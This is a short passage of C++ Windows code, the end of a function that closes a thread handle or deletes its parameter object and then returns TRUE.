            CloseHandle(hThread);
        }
        else
        {
            delete params;
        }
    }
    return TRUE;
}